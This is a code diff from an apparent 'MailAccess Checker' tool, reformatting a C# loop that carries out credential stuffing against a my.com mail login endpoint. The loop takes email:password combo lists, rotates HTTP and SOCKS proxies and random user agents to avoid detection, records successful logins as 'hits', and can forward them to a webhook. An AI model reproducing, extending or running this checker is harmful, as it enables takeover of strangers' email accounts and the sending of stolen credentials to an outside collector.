@@ -148,55 +148,55 @@ namespace MailAccess_Checker
 
         public static void check()
         {
-		    while(Thread.CurrentThread.IsAlive) {
-	                using (var req = new HttpRequest())
-	                {
-	                    try
-	                    {
-	                        string proxy = proxies.ElementAt<string>(new Random().Next(proxies.Count));
-	                        var array = combos[comboIndex].Split(':', ';', '|');
-	                        Interlocked.Increment(ref comboIndex);
-	                        totalChecked++;
+            while (Thread.CurrentThread.IsAlive)
+            {
+                using (var req = new HttpRequest())
+                {
+                    try
+                    {
+                        string proxy = proxies.ElementAt<string>(new Random().Next(proxies.Count));
+                        var array = combos[comboIndex].Split(':', ';', '|');
+                        Interlocked.Increment(ref comboIndex);
+                        totalChecked++;
 
-	                        switch (proxyType)
-	                        {
-	                            case "HTTP":
-	                                req.Proxy = HttpProxyClient.Parse(proxy);
-	                                req.Proxy.ConnectTimeout = 5000;
-	                                break;
-	                            case "SOCKS4":
-	                                req.Proxy = Socks4ProxyClient.Parse(proxy);
-	                                req.Proxy.ConnectTimeout = 5000;
-	                                break;
-	                            case "SOCKS5":
-	                                req.Proxy = Socks5ProxyClient.Parse(proxy);
-	                                req.Proxy.ConnectTimeout = 5000;
-	                                break;
-	                        }
+                        switch (proxyType)
+                        {
+                            case "HTTP":
+                                req.Proxy = HttpProxyClient.Parse(proxy);
+                                req.Proxy.ConnectTimeout = 5000;
+                                break;
+                            case "SOCKS4":
+                                req.Proxy = Socks4ProxyClient.Parse(proxy);
+                                req.Proxy.ConnectTimeout = 5000;
+                                break;
+                            case "SOCKS5":
+                                req.Proxy = Socks5ProxyClient.Parse(proxy);
+                                req.Proxy.ConnectTimeout = 5000;
+                                break;
+                        }
 
-	                        req.UserAgent = Http.RandomUserAgent();
+                        req.UserAgent = Http.RandomUserAgent();
 
-	                        string request = req.Post("https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=" + array[0] + "&Password=" + array[1]).ToString();
+                        string request = req.Post("https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=" + array[0] + "&Password=" + array[1]).ToString();
 
-	                        if (request.Contains("Ok=1"))
-	                        {
-	                            // Hit
-	                            hits++;
-	                            Utils.AsResult("/MailAcess", array[0] + ":" + array[1]);
-	                            if (webhook)
-	                                Utils.sendTowebhook(array[0] + ":" + array[1], "MailAcess");
-	                        }
-	                        else
-	                            bads++;
+                        if (request.Contains("Ok=1"))
+                        {
+                            // Hit
+                            hits++;
+                            Utils.AsResult("/MailAcess", array[0] + ":" + array[1]);
+                            if (webhook)
+                                Utils.sendTowebhook(array[0] + ":" + array[1], "MailAcess");
+                        }
+                        else
+                            bads++;
 
-	                    }
-	                    catch (Exception ex)
-	                    {
-	                        errors++;
-	                    }
-	                }
-	            }
-	        }
+                    }
+                    catch (Exception ex)
+                    {
+                        errors++;
+                    }
+                }
+            }
         }
 
         public static void ComboLoad()
